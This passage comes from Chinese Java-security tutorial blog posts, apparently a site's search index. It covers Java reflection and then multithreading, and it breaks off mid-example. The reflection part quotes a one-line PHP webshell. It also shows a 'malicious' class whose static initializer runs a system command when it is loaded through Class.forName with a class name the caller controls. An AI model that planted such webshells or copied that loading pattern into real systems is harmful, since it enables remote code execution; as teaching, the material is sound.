一般对象的类型都是在编译期就确定下来的 . 而通过 Java 反射机制 , 可以动态的创建对象并调用其方法和属性 。\n\nJava反射的功能​    正是因为 PHP 中存在多种动态特性 , 使得开发人员能通过很少的代码来实现非常多的功能 . 比较典型的例子就是一句话木马 , 通过一行 &lt;?php @eval($_POST[cmd]); 能实现目录管理 , 命令执行 , 数据库连接 , 文件上传下载等多种多样的功能 .\n​    但是 Java 本身是一门静态语言 , 无法像 PHP 那么灵活多变 . 但是通过 Java 反射机制 , 可以为自身提供一些动态特性 . 当我们在通过 IDE 写代码时 , 敲击点号” . “ , 会出现当前对象或类所包含的属性和方法 . 这里用到的就是 Java 反射机制 .\n​    而且 , 反射最重要的用途是开发各种通用框架 . 很多框架都是通过XML文件来进行配置的( 例如 struts.xml , spring-*.xml 等 ) , 即所谓的框架核心配置文件 . 为了确保框架的通用性 , 程序运行时需要根据配置文件中对应的内容加载不同的类或对象 , 调用不同的方法 , 这也依赖于 Java 反射机制 .\n综上所述 , Java 反射机制的功能可分为如下几点 :\n\n在程序运行时查找一个对象所属的类 .\n在程序运行时查找任意一个类的成员变量和方法 .\n在程序运行时构造任意一个类的对象 .\n在程序运行时调用任意一个对象的方法 .\n\n查找一个对象所属的类​    如何获取一个类( java.lang.Class )呢? 总的而言有三种方法 .\n\nobj.getClass()\nClass.forName(className)\nclassName.class\n\n​    具体的使用方法如下所示:\n//查找对象所属的类public class getClass &#123;    public getClass(String name)&#123;        System.out.println(name);    &#125;    public static void main(String[] args) throws ClassNotFoundException &#123;        getClass gc1 = new getClass(&quot;mes9s0&quot;);        //已知上下文中存在某个类的实例对象名称        //可以调用obj.getClass()获取实例对象所属的类        System.out.println(&quot;通过obj.getClass()获得所属的类：&quot; + gc1.getClass());        //已知某个类的名称        //可以调用Class.getClass(&quot;className&quot;)来获取类        System.out.println(&quot;通过Class.forName(&#x27;className&#x27;)获取类：&quot; + Class.forName(&quot;getClass&quot;));        //当已经加载了某个类        //可以通过className.class属性来获取类        System.out.println(&quot;通过className.class属性获取类：&quot;+getClass.class);    &#125;&#125;\n\n\n​    针对不同的情况 , 可以用不同的方法来获取类 .\n​    需要注意的是 : forName( ) 函数有两个重载 , 如下所示 :\n\nClass.forName( String className )\nClass.forName( String className , Boolean initialize , ClassLoader loader )\n\nString className : 类名\nBoolean initialize : 是否进行类初始化\nClassLoader loader : 加载器( 告诉 Java 虚拟机如何加载获取的类 , Java 默认根据类名( 即类的绝对路径 , 例如 java.lang.Runtime( ) )来加载类，Runtime类在Java安全从零到一（3）中讲过 )\n\n其中 , 第一种方法是对第二种方法的封装 , 存在以下对应关系 :\nClass.forName( String className ) == Class.forName( String className , True , currentLoader )\n\n​    那么这个类初始化是指什么呢 ? \n//类初始化public class test1 &#123;    &#123;        System.out.println(&quot;构造代码块&quot;);    &#125;    static &#123;        System.out.println(&quot;静态代码块&quot;);    &#125;    public test1() &#123;        System.out.println(&quot;构造函数&quot;);    &#125;    public void test1test() &#123;        System.out.println(&quot;普通代码&quot;);    &#125;    public static void main(String[] args) throws ClassNotFoundException &#123;        Class&lt;?&gt; cls = Class.forName(&quot;test1&quot;);//类初始化，初始化时会加载静态代码块        System.out.printf(String.valueOf(cls));    &#125;&#125;\n\n\n​    这个部分在我的Java安全从零到一(2)中讲过，可以详细翻看\n​    结果表明 , 在 Java 类初始化时 , 会执行静态代码块中的内容 .\n​    那也就是说 , 如果我们能控制一个类 , 那么就可以通过在类中添加包含恶意代码的静态代码块 . 当类初始化时 , 默认会自动执行恶意代码. 如下所示 :\n\n假设存在如下代码 :\n\npublic class vul &#123;    public vul(String string) throws ClassNotFoundException &#123;        Class.forName(string);    &#125;    public static void main(String[] args) throws ClassNotFoundException &#123;        vul v = new vul(&quot;test2&quot;);        //实例化 vul 类，调用构造方法 vul, vul()方法中通过 Class.forName(className) 方法来获取类,获取类时默认进行类初始化，调用静态代码块 static&#123;&#125;    &#125;&#125;\n\n​    此时 , 如果我们能控制 test2类 , 那么就能执行任意代码 .\n\n构造恶意的 test2 类：\n\nimport java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;public class test2 &#123;    static &#123;        try &#123;            //执行系统命令            Process p = java.lang.Runtime.getRuntime().exec(&quot;id&quot;);            //获取p的标准输入流作为输入字节流            InputStream is = p.getInputStream();            //字节流转化为字符流            InputStreamReader isr = new InputStreamReader(is);            //将字符流存入缓冲区            BufferedReader br = new BufferedReader(isr);            String line = null;            //逐一读取字符流中缓冲区的每一行            while ((line = br.readLine()) != null) &#123;                System.out.printf(line);            &#125;        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n​    这个恶意类的内容是在该类静态代码块中 , 通过 java.lang.Runtime.getRuntime( ).exec( ) 执行系统命令 , 并将返回字节流转换为字符流 , 存入缓冲区后逐行读取并输出 .\n\n当调用 vul 类时 , 会自动执行恶意代码 .\n\n\n查找任意一个类的成员变量和方法如何获取某一个类的所有方法呢? 总的来说有三种方法 .\n\nclassName.getMethod(functionName , [parameterTypes.class])\nclassName.getMethods()\nclassName.getDeclaredMethods()\n\n//查找一个类的方法import java.lang.reflect.Method;public class getMethod &#123;    class methodClass &#123;        public int add(int a, int b) &#123;            return a + b;        &#125;    &#125;    public static void main(String[] args) throws NoSuchMethodException &#123;        Class&lt;?&gt; cls = methodClass.class;//通过className.class获取类        //获取类方法的三种方式        Method method = cls.getMethod(&quot;add&quot;, int.class, int.class);        Method[] methods = cls.getMethods();//获取某个类的public方法        Method[] declareMethods = cls.getDeclaredMethods();//获取某个类的公共，保护，默认方法，不包括继承        //输出结果        //className.getMethod        System.out.println(&quot;getMethod获取方法&quot; + method);        System.out.println(&quot;\\ngetMethods获取的方法:&quot;);        for (Method m : methods) &#123;            System.out.println(m);        &#125;        System.out.println(&quot;\\ngetDeclaredMethods获取的方法&quot;);        for (Method m : declareMethods) &#123;            System.out.println(m);        &#125;    &#125;&#125;\n\n\n​    getMethod( ) : 返回类中一个特定的方法 . 其中第一个参数为方法名称 , 后面的参数为方法的参数对应 Class 的对象 .\n​    getMethods( ) : 返回某个类的所有公用（public）方法 , 包括其继承类的公用方法 .\n​    getDeclaredMethods( ) : 返回某个类或接口声明的所有方法 , 包括公共、保护、默认（包）访问和私有方法 , 但不包括其继承类的方法 .\n补充：$是内部类的意思\n构造任意一个类的对象​    上文提到了可以通过三种方式来获取类 , 那么如果获取一个实例对象呢 ?\n​    通过 className.newInstance() 来构建一个实例对象.\n​    我们都知道在类实例化时会调用构造函数 , 而构造函数又分为 “ 有参构造函数 “ 和 “ 无参构造函数 “ . 然而 className.newInstance() 没有参数 , 只能调用无参构造函数（注意，该方法已经被弃用，新的在代码中） . 如果我们想要调用有参构造函数 , 就必须依赖于 Class 类的 getConstructor() 方法 .\n​    通过 Class 类的 getConstructor() 方法 , 可以获取 Constructor 类的一个实例 , Constructor 类也存在一个 newInstance() 方法 , 不过该方法可以携带参数 . 用该方法来创建实例对象可以调用有参构造函数 .\n//构造任意一个类的对象import java.lang.reflect.InvocationTargetException;public class newInstance &#123;    //无参构造函数    public newInstance()&#123;        System.out.println(&quot;这是无参构造函数&quot;);    &#125;    //有参构造函数    public newInstance(String str)&#123;        System.out.println(str);    &#125;    public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;        Class&lt;?&gt; cls = Class.forName(&quot;newInstance&quot;);        System.out.println(&quot;通过className.newInstance()创建实例对象，默认调用无参构造函数,但是该方法已被弃用&quot;);        newInstance obj1 = (newInstance)cls.newInstance();        System.out.println(&quot;通过className.getConstrutor().newInstance()创建实例对象，可以添加参数调用有参构造函数&quot;);        newInstance obj2 = (newInstance)cls.getConstructor(String.class).newInstance(&quot;这里有参构造函数&quot;);        System.out.println(&quot;此处为新的无参构造函数调用&quot;);        newInstance obj3 = (newInstance)cls.getDeclaredConstructor().newInstance();    &#125;&#125;\n\n\n\nclassName.newInstance()\nclassName.getConstructor( parameterType ).newInstance( parameterName )\nclassName.getDeclaredConstructor().newInstance()\n\n​    因此 , 我们可以通过 newInstance() 方法来构造任何一个类的对象 . 并且可以选择是调用其无参构造方法 , 还是有参的构造方法 .\n调用任意一个实例对象的方法​    有了实例对象 , 如何调用调用该对象的方法呢 ?\n​    一般来说 , 可以通过 objectName.functionName() 这种格式来调用实例方法 . 举个例子 .\n//调用任意一个实例对象的方法import java.lang.reflect.InvocationTargetException;public class invoke &#123;    public String prt(String name) &#123;        return name;    &#125;    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;        String name = &quot;mes9s0&quot;;        Class&lt;?&gt; cls = Class.forName(&quot;invoke&quot;);        invoke ivk = (invoke) cls.getDeclaredConstructor().newInstance();        //通过objectName.functionName()来调用实例方法      \tString str1 = ivk.prt(name);        System.out.println(str1);    &#125;&#125;\n\n\n​    但是在很多情况下 , 并不知道类名, 也就无法 new 出实例对象 , 更别提调用实例对象的方法了 . 当遇到这种情况时 , 就需要使用 Java 反射来调用实例对象的方法了 .\n以下就是思路了：\n\n不知道类怎么办 ?\n我们可以通过 obj.getClass() , Class.forName(className) , className.class 来获取类.\n\n不知道类有哪些方法怎么办 ?\n我们可以通过 className.getMethod(functionName , [parameterTypes.class]) , className.getMethods() , className.getDeclaredMethods() 来获取类的方法.\n\n不能 new 出实例对象怎么办 ?\n我们可以通过 className.newInstance() , className.getConstructor().newInstance() 来构造实例对象 .\n\n那如何调用实例对象的方法呢 ?\n通过 invoke() 方法来调用任何一个实例对象的方法 !\n\n\n看看定义，它是Method对象调用的：\n\n我们把上面的代码改成invoke获得的\n//调用任意一个实例对象的方法import java.lang.reflect.InvocationTargetException;public class invoke &#123;    public String prt(String name) &#123;        return name;    &#125;    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;        String name = &quot;mes9s0&quot;;        Class&lt;?&gt; cls = Class.forName(&quot;invoke&quot;);        invoke ivk = (invoke) cls.getDeclaredConstructor().newInstance();//        String str1 = ivk.prt(name);//        System.out.println(str1);        Object ret = cls.getMethod(&quot;prt&quot;, String.class).invoke(ivk, name);        System.out.println(ret);    &#125;&#125;\n\n\nMethod.invoke(obj , args[])\n​    如上文所说的 , 通过Java反射机制来获取类 , 获取类的方法 , 构造实力对象 , 最终调用实例方法 .\n​    注 : 官方文档中提到了一些比较有意思的东西 , 需要注意 .\n​    如果要调用的方法是静态的 , 则忽略 obj 参数 .这个点其实比较好理解 , 我们知道Java中调用静态方法是无需创建实例对象的 , 所以这里可以省略 obj 参数 .\n​    如果要调用的方法的形参个数为 “ 0 “ , 那么 args[] 数组的长度可以为 “ 0 “ 或者 “ null “ . 这个点其实也没啥说的 , args[] 数组本就是要调用方法的参数 , 既然目标方法没有参数 , 这里自然也就不用写 .\n\n​    关于反射的流程以及代码基本介绍完全了，参考了很多师傅的文章博客CSDN等总结，所有的代码可以直接复制跑通，本人均是跑通成功后的代码，下面介绍一下RCE(Remote Code Execute)\n","categories":["Java安全基础篇"],"tags":["开发","Java","安全","反射"]},{"title":"Java安全从零到一(3)-Java高级编程","url":"/2022/08/04/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-3-Java%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B/","content":"Java多线程编程​    在Java语言里面最大的特点是支持多线程的开发(也是为数不多支持多线程的编程语言)，所以在整个的JAVA技术的学习里面，如果你不能够对多线程的概念有一个全面并且细致的了解，则在日后进行一些项目设计的过程之中是并发访问设计的过程之中就会出现严重的技术缺陷。\n进程与线程​    进程的概念：\n​    在传统的DOS系统的时代，其本身有一个特征：如果你电脑上出现了病毒，那么所有的程序将无法执行，因为传统的DOS采用的是单进程处理，而单进程处理的最大特点：在同一个时间段上只允许一个程序在执行。\n​    后来到了Windows 的时代就开启了多进程的设计，于是就表示在一个时间段上可以同时运行多个程序，并且这些程序将进行资源的轮流抢占。所以在同一个时间段上会有多个程序依次执行，但是在同一个时间点上只会有一个进程执行。而后来到了多核的CPU，由于可以处理的CPU多了，那么即便有再多的进程出现，也可以比单核CPU处理的速度有所提升。\n\n​    线程的概念：\n​    线程是在进程基础之上划分的更小的程序单元，线程是在进程基础上创建并且使用的，所以线程依赖于进程的支持，但是线程的启动速度要比进程快很多，所以当使用多线程进行并发处理的时候，其执行的性能要高于进程。\n​    Java是多线程的编程语言，所以Java在进行并发访问处理的时候可以得到更高的处理性能。\nThread 类实现多线程​    如果要想在 Java 之中实现多线程的定义，那么就需要有一个专门的线程主体类进行线程的执行任务的定义，而这个主体类的定义是有要求的，必须实现特定的接口或者继承特定的父类才可以完成。\n​    继承 Thread 类实现多线程：\n​    Java 里面提供有一个 java.lang.Thread 的程序类，那么一个类只要继承了此类就表示这个类为线程的主体类。但是并不是说这个类就可以直接实现多线程处理了，因为还需要覆写 Thread 类中提供的一个 run(public void run()）方法，而这个方法就属于线程的主方法。\n范例：多线程主体类\nclass MyThread extends Thread &#123; //线程的主体类    private String title;    public MyThread(String title) &#123;        this.title = title;    &#125;    @Override    public void run() &#123; //线程的主体方法        for (int x = 0; x &lt; 10; x++) &#123;            System.out.println(this.title + &quot;运行，x=&quot; + x);        &#125;    &#125;&#125;\n\n​    多线程要执行的功能都应该在 run()方法中进行定义。\n​    需要说明的是：在正常情况下如果要想使用一个类中的方法，那么肯定要产生实例化对象，而后去调用类中提供的方法，但是 run()方法是不能够被直接调用的，因为这里面牵扯到一个操作系统的资源调度问题，所以要想启动多线程必须使用start() 方法完成（public void start()）。\npublic static void main(String[] args) &#123;    new MyThread(&quot;线程A&quot;).run();    new MyThread(&quot;线程B&quot;).run();    new MyThread(&quot;线程C&quot;).run();&#125;\n\n\n​    我们这么调用一下，可以发现是顺序执行，并没有交替执行。\n范例：多线程启动\npackage three;//thread类实现多线程class MyThread extends Thread &#123; //线程的主体类    private String title;    public MyThread(String title) &#123;        this.title = title;    &#125;    @Override    public void run() &#123; //线程的主体方法        for (int x = 0; x &lt; 10; x++) &#123;            System.out.printf(this.title + &quot;运行，x=&quot; + x);        &#125;    &#125;&#125;public class Test1 &#123;    public static void main(String[] args) &#123;        new MyThread(&quot;线程A&quot;).start();        new MyThread(&quot;线程B&quot;).start();        new MyThread(&quot;线程C&quot;).start();    &#125;&#125;\n\n\n​    通过此时的调用可以发现，虽然调用了是 start()方法，但是最终执行的是 run()方法，并且所有的线程对象都是交替执行的。执行顺序不可控。\nstart方法分析\n​    为什么多线程的启动不直接使用 run() 方法而必须使用 Thread 类中的 start()方法呢？如果要想清楚这个问题，最好的做法是查看一下 start() 方法的实现操作，可以直接通过源代码观察。\npublic synchronized void start() &#123;    if (threadStatus != 0) //判断线程状态        throw new IllegalThreadStateException(); //抛出一个异常    group.add(this);    boolean started = false;    try &#123;        start0(); //在start()方法里调用了start0()方法        started = true;    &#125; finally &#123;        try &#123;            if (!started) &#123;                group.threadStartFailed(this);            &#125;        &#125; catch (Throwable ignore) &#123;        &#125;    &#125;&#125;private native void start0();//只定义了方法名称，没有实现@Overridepublic void run() &#123;    if (target != null) &#123;        target.run();    &#125;&#125;\n\n​    发现在 start() 方法里面会抛出一个“IllegalThreadStateException”异常类对象，但是整个的程序并没有使用 throws 或者是明确的 try..catch 处理，因为该异常一定是 RuntimeException 的子类，每一个线程类的对象只允许启动一次,如果重复启动则就抛出此异常。\n范例：会抛出异常的代码\npublic static void main(String[] args) &#123;    MyThread mt = new MyThread(&quot;线程A&quot;);    mt.start();    mt.start(); //重复启动线程&#125;\n\n\n​    在 Java 程序执行的过程之中考虑到对于不同层次开发者的需求，所以其支持有本地的操作系统函数调用，而这项技术就被称为 JNI（Java Native Inteface）Java本地接口技术，但是 Java 开发过程之中并不推荐这样使用，利用这项技术可以使用一些操作系统提供底层函数进行一些特殊的处理，而在 Thread 类里面提供的 start0()就表示需要将此方法依赖于不同的操作系统实现。\nThread执行分析\n\n​    任何情况下，只要定义了多线程，多线程的启动永远只有一种方案:Thread 类中的start()方法。\nRunnable接口实现多线程​    虽然可以通过Thread类的继承来实现多线程的定义，但是在Java程序里面对于继承永远都是存在有单继承局限的，所以在JAVA里面又提供有第二种多线程的主体定义结构形式:实现java.lang.Runnable接口，此接口定义如下：\n@FunctionalInterface  //从JDK1.8引入了Lambda表达式之后就变为了函数式接口public interface Runnable&#123;    public void run();&#125;\n\n范例：通过Runnable实现多线程的主体类\nclass MyThread1 implements Runnable &#123; //主体类    private String title;    public MyThread1(String title) &#123;        this.title = title;    &#125;    @Override    public void run() &#123;        for (int x = 0; x &lt; 10; x++) &#123; //线程的主体方法            System.out.printf(this.title + &quot;运行，x =&quot; + x);        &#125;    &#125;&#125;\n\n​    但是此时由于不再继承Thread父类了，那么对于此时的MyThread类中也就不再支持有start()这个继承的方法，可是如果不使用Thread.start()方法是无法进行多线程启动的，那么就需要去观察一下Thread类所提供的构造方法。\n​    构造方法: public Thread(Runnable target);\n范例：启动多线程\npackage three;//Runnable接口多线程class MyThread1 implements Runnable &#123; //主体类    private String title;    public MyThread1(String title) &#123;        this.title = title;    &#125;    @Override    public void run() &#123;        for (int x = 0; x &lt; 10; x++) &#123; //线程的主体方法            System.out.printf(this.title + &quot;运行，x =&quot; + x);        &#125;    &#125;&#125;public class Test2 &#123;    public static void main(String[] args) &#123;        Thread threadA = new Thread(new MyThread1(&quot;线程对象A&quot;));        Thread threadB = new Thread(new MyThread1(&quot;线程对象B&quot;));        Thread threadC = new Thread(new MyThread1(&quot;线程对象C&quot;));        threadA.start();        threadB.start();        threadC.start();    &#125;&#125;\n\n​    多线程实现里面可以发现，由于只是实现了Runnable 接口对象，所以此时线程主体类上就不再有单继承局限了，这样的设计才是一个标准型的设计。\n​    可以发现从JDK1.8开始，Runnable接口使用了函数式接口定义，所以也可以直接利用Lambda表达式进行线程类实现。\n范例:利用Lambda实现多线程定义\npublic class Test2 &#123;    public static void main(String[] args) &#123;        for (int x = 0; x &lt; 3; x++) &#123;            String title = &quot;线程对象-&quot; + x;            Runnable run = () -&gt; &#123;                for (int y = 0; y &lt; 10; y++) &#123;                    System.out.println(title + &quot;运行，y =&quot; + y);                &#125;            &#125;;            new Thread(run).start();        &#125;    &#125;&#125;\n\npublic class Test2 &#123;    public static void main(String[] args) &#123;        for (int x = 0; x &lt; 3; x++) &#123;            String title = &quot;线程对象-&quot; + x;            new Thread(() -&gt; &#123;                for (int y = 0; y &lt; 10; y++) &#123;                    System.out.println(title + &quot;运行，y =&quot; + y);                &#125;            &#125;).start();        &#125;    &#125;&#125;\n\n\n​    在以后的开发之中对于多线程的实现，优先考虑Runnable接口实现，并且永恒都是通过Thread类对象启动多线程。\nThread与Runnable关系​    经过一系列的分析之后可以发现，在多线程的实现过程之中已经有了两种做法:Thread 类、Runnable 接口，如果从代码的结构本身来讲肯定使用 Runnable 是最方便的，因为其可以避免单继承的局限，同时也可以更好的进行功能的扩充。\n​    但是从结构上也需要来观察 Thread 与 Runnable 的联系。\n​    打开 Thread 类的定义:\npublic class Thread extends Object implements Runnable&#123;&#125;\n\n​    发现现在 Thread 类也是 Runnable,接口的子类，那么在之前继承 Thread 类的时候实际上覆写的还是 Runnable 接口的 run() 方法，于是此时来观察一下程序的类结构。\n以这个程序为例：\npackage three;//Runnable接口多线程class MyThread1 implements Runnable &#123; //主体类    private String title;    public MyThread1(String title) &#123;        this.title = title;    &#125;    @Override    public void run() &#123;        for (int x = 0; x &lt; 10; x++) &#123; //线程的主体方法            System.out.printf(this.title + &quot;运行，x =&quot; + x);        &#125;    &#125;&#125;public class Test2 &#123;    public static void main(String[] args) &#123;        Thread threadA = new Thread(new MyThread1(&quot;线程对象A&quot;));        Thread threadB = new Thread(new MyThread1(&quot;线程对象B&quot;));        Thread threadC = new Thread(new MyThread1(&quot;线程对象C&quot;));        threadA.start();        threadB.start();        threadC.start();    &#125;&#125;\n\n\n​    多线程的设计之中，使用了代理设计模式的结构，用户自定义的线程主体只是负责项目核心功能的实现，而所有的辅助实现全部交由 Thread 类来处理。\n​    在进行 Thread 启动多线程的时候调用的是 start() 方法，而后找到的是 run()方法。\n\n\n\n\n​    当通过 Thread 类的构造方法传递了一个 Runnable 接口对象的时候，那么该接口对象将被 Thread 类中的 target 属性所保存，在 start() 方法执行的时候会调用Thread类中的 run() 方法\n\n​    而这个 run() 方法去调用 Runnable 接口子类被覆写过的 run() 方法。\n​    多线程开发的本质实质上是在于多个线程可以进行同一资源的抢占，那么 Thread 主要描述的是线程,而资源的描述是通过 Runnable 完成的。\n\n范例:利用卖票程序来实现多个线程的资源并发访问\npackage three;//Thread和Runnable的关系class MyThread2 implements Runnable &#123; //线程的主体类    private int ticket = 5;    @Override    public void run() &#123; //线程的主体方法        for (int x = 0; x &lt; 100; x++) &#123;            if (this.ticket &gt; 0) &#123;                System.out.println(&quot;卖票,ticket = &quot; + this.ticket--);            &#125;        &#125;    &#125;&#125;public class Test3 &#123;    public static void main(String[] args) &#123;        MyThread2 mt = new MyThread2();        new Thread(mt).start(); //第一个线程启动        new Thread(mt).start(); //第二个线程启动        new Thread(mt).start(); //第三个线程启动    &#125;&#125;\n\n\n​    通过内存分析图来分析本程序的执行结构。\n​    \nCallable接口实现多线程​    从最传统的开发来讲如果要进行多线程的实现肯定依靠的就是 Runnable。\n​    但是 Runnable 接口有一个缺点：当线程执行完毕之后后无法获取一个返回值，所以从 JDK 1.5 之后就提出了一个新的线程实现接口:java.util.concurrent.Collable 接口。\n​    观察接口的定义：\n@FunctionalInterface.public interface callable&lt;V&gt; &#123;\tpublic V call() throws Exception ;&#125;\n\n​    可以发现 Callable 定义的时候可以设置一个泛型，此泛型的类型就是返回数据的类型，这样的好处是可以避免向下转型所带来的安全隐患。\nCallable接口和Thread类关系实现关系图\n\n范例：使用Callable实现线程处理\npackage three;//使用Callable实现线程import java.util.concurrent.Callable;import java.util.concurrent.ExecutionException;import java.util.concurrent.FutureTask;class MyThread3 implements Callable&lt;String&gt;&#123;    @Override    public String call() throws Exception &#123;        for (int x = 0;x&lt;10;x++)&#123;            System.out.println(&quot;**********线程执行、x= &quot; + x);        &#125;        return &quot;线程执行完毕&quot;;    &#125;&#125;public class Test4 &#123;    public static void main(String[] args) throws ExecutionException, InterruptedException &#123;        FutureTask&lt;String&gt; task = new FutureTask&lt;&gt;(new MyThread3());        new Thread(task).start();        System.out.println(&quot;【线程返回数据】&quot; + task.get());    &#125;&#125;\n\n\n​    请解释 Runnable 与  Callable 的区别?\n​    1.Runnable 是在 JDK1.0的时候提出的多线程的实现接口，而 Callable 是在 JDK 1.5之后提出的；\n​    2.java.lang.Runnable 接口之中只提供有一个 run()方法，并且没有返回值;\n​    3.java.util.concurrent.Callable 接口提供有 call()方法，可以有返回值;\n多线程运行状态​    对于多线程的开发而言，编写程序的过程之中总是按照：\n​    定义线程主体类，而后通过Thread类进行线程，但是并不意味着你调用了start()方法，线程就已经开始运行了，因为整体的线程处理有自己的一套运行的状态。\n\n\n 任何一个线程的对象都应该使用Thread类进行封装，所以线程的启动使用的是start()，但是启动的时候实际上若干个线程都将进入到一种就绪状态，现在并没有执行；\n 进入到就绪状态之后就需要等待进行资源的调度，当某一个线程调度成功之后侧进入到运行状态（run()方法），但是所有的线程不可能一直持续执行下去，中间需要产生一些暂停的状态，例如：某个线程执行一段时间之后就需要让出资源；而后这个线程就进入到阻塞状态随后重新回归到就绪状态；\n 当run()方法执行完毕之后，实际上该线程的主要任务也就结束了，那么此时就可以直接进入到停止状态。\n\n\n线程常用操作方法​    多线程的主要操作方法都在Thread类中定义了。\n线程的命名和取得​    多线程的运行状态是不确定的，那么在程序开发之中为了可以获取到一些需要使用的线程就只能依靠线程的名字来进行操作。所以线程的名字是一个至关重要的概念，这样在Thread类之中就提供有线程名称的处理。\n​    ·构造方法：public Thread(Runnable target,String name);\n​    ·设置名字：public final void setName(String name);\n​    ·取得名字：public final String getName()；\n​    对于线程对象的获得是不可能只靠一个this来完成的，因为线程的状态不可控，但是有一点是明确的，所有的线程对象都一定要执行run（）方法，那么这个时候可以考虑获取当前线程，在Thread类里面提供有获取当前线程的一个方法。\n​    ·获取当前线程：public static Thread currentThread():\n范例：观察线程的命名操作\npackage three;//线程的命名与取得class MyThread4 implements Runnable&#123;    @Override    public void run() &#123;        System.out.println(Thread.currentThread().getName());    &#125;&#125;public class Test5 &#123;    public static void main(String[] args) &#123;        MyThread4 mt = new MyThread4();        new Thread(mt,&quot;线程A&quot;).start(); //设置了线程的名字        new Thread(mt).start(); //未设置线程名字        new Thread(mt,&quot;线程B&quot;).start(); //设置了线程的名字    &#125;&#125;\n\n\npublic static void main(String[] args) &#123;    MyThread4 mt = new MyThread4();    new Thread(mt, &quot;线程A&quot;).start(); //设置了线程的名字    new Thread(mt).start(); //未设置线程名字    new Thread(mt).start(); //未设置线程名字    new Thread(mt).start(); //未设置线程名字    new Thread(mt).start(); //未设置线程名字    new Thread(mt).start(); //未设置线程名字    new Thread(mt, &quot;线程B&quot;).start(); //设置了线程的名字&#125;\n\n\n​    当开发者为线程设置名字的时候，而如果没有设置名字，则会自动生成一个不重复的名字，这种自动的属性命名主要是依靠了static属性完成的，在Thread类里面定义了如下操作：\n\npublic Thread(Runnable target) &#123;    this(null, target, &quot;Thread-&quot; + nextThreadNum(), 0);&#125;\n\n\nprivate static int threadInitNumber;private static synchronized int nextThreadNum() &#123;    return threadInitNumber++;&#125;\n\n​    上面两个操作也就是完成自动编号的原理。\n范例：观察一个程序\npackage three;//线程的命名与取得class MyThread4 implements Runnable &#123;    @Override    public void run() &#123;        System.out.println(Thread.currentThread().getName());    &#125;&#125;public class Test5 &#123;    public static void main(String[] args) &#123;        MyThread4 mt = new MyThread4();        new Thread(mt, &quot;线程对象&quot;).start(); //设置了线程的名字        mt.run();//对象直接调用run()方法    &#125;&#125;\n\n\n​    通过此时的代码可以发现当使用了“mt.run()”直接在主方法中调用线程类对象中的run()方法所获得的线程对象的名字为“main”，所以可以得出一个结论：主方法也是一个线程。那么现在的问题来了，所有的线程都是在进程上的划分，那么进程在哪里？\n​    事实上，每当使用Java命令执行程序的时候就表示启动了一个JVM的进程，一台电脑上可以同时启动若干个JVM进程所以每一个JVM的进程都会有各自的线程。\n​    在任何的开发之中，主线程可以创建若干个子线程，创建子线程的目的是可以将一些复杂逻辑或者比较耗时的逻辑交给子线程处理；\n范例：子线程的处理\n原本代码：\npackage three;//子线程的处理public class Test6 &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;1、操作任务一。&quot;);        int temp = 0;        for (int x = 0; x &lt; Integer.MAX_VALUE; x++) &#123;            temp += x;        &#125;        System.out.println(&quot;2、操作任务二。&quot;);        System.out.println(&quot;n、操作任务N。&quot;);    &#125;&#125;\n\n\n​    在执行过程中，操作任务一与二中间会耽误一下，我们就需要启动一个子线程。\npackage three;//子线程的处理public class Test6 &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;1、操作任务一。&quot;);        new Thread(()-&gt;&#123;            int temp = 0;            for (int x = 0; x &lt; Integer.MAX_VALUE; x++) &#123;                temp += x;            &#125;        &#125;).start();        System.out.println(&quot;2、操作任务二。&quot;);        System.out.println(&quot;n、操作任务N。&quot;);    &#125;&#125;\n\n​    主线程负责处理整体流程，而子线程负责处理耗时流程。\n线程的休眠​    如果现在希望某一个线程可以暂缓执行，那么可以使用休眠的处理。在 Thread 类之中定义的休眠的方法如下：\n​    休眠1:\npublic static void sleep(long millis) throws InterruptedException;\n\n​    休眠2:\npublic static void sleep(long mills,int nanos) throws InterruptedException;\n\n​    在进行休眠的时候有可能会产生中断异常“InterruptedException”,中断异常属于Exception 的子类，所以证明该异常必须进行休眠处理。\n范例：观察休眠处理\npackage three;//线程的休眠public class Test7 &#123;    public static void main(String[] args) &#123;        new Thread(() -&gt; &#123;            for (int x = 0; x &lt; 10; x++) &#123;                System.out.println(Thread.currentThread().getName() + &quot;、 x = &quot; + x);                try &#123;                    Thread.sleep(100); //暂缓执行                &#125; catch (InterruptedException e) &#123;                    throw new RuntimeException(e);                &#125;            &#125;        &#125;, &quot;线程对象&quot;).start();    &#125;&#125;\n\n​    暂缓执行之后执行慢了，休眠时间一到程序马上回复继续执行。\n​    休眠的主要特点是可以自动实现线程的唤醒，以继续进行后续的处理。但是需要注意的是，如果现在你有多个线程对象，那么休眠也是有先后顺序的。\n范例：产生多个线程对象进行休眠处理\npackage three;//线程的休眠public class Test7 &#123;    public static void main(String[] args) &#123;        Runnable run = ()-&gt;&#123;            for (int x = 0; x &lt; 10; x++) &#123;                System.out.println(Thread.currentThread().getName() + &quot;、 x = &quot; + x);                try &#123;                    Thread.sleep(100); //暂缓执行                &#125; catch (InterruptedException e) &#123;                    throw new RuntimeException(e);                &#125;            &#125;        &#125;;        for (int num = 0;num &lt; 5;num++)&#123;            new Thread(run, &quot;线程对象 - &quot; + num).start();        &#125;    &#125;&#125;\n\n​    \n​    此时五个线程对象，并且这五个线程对象执行的方法体是相同的。\n​    此时从程序执行的感觉来讲，就像是若干个线程一起进行了休眠然后一起进行了自动唤醒，但是实际上是有差别的。\n\n​    注意：对象进入run()方法，提示文字的输出，线程休眠都是有先有后进入的。所以不是同时休眠，也不是同时唤醒的，中间是有适当的延迟操作的。\n线程中断​    在之前发现线程的休眠里面提供有一个中断异常，实际上就证明线程的休眠是可以被打断的，而这种打断肯定是由其他线程完成的，在Thread类里面提供有这种中断执行的处理方法：\n​    ·判断线程是否被中断：public boolean isInterrupted();\n​    ·中断线程执行：public void interrupt();\n范例：观察线程中断操作\npackage three;//线程中断public class Test8 &#123;    public static void main(String[] args) throws InterruptedException &#123;        Thread thread = new 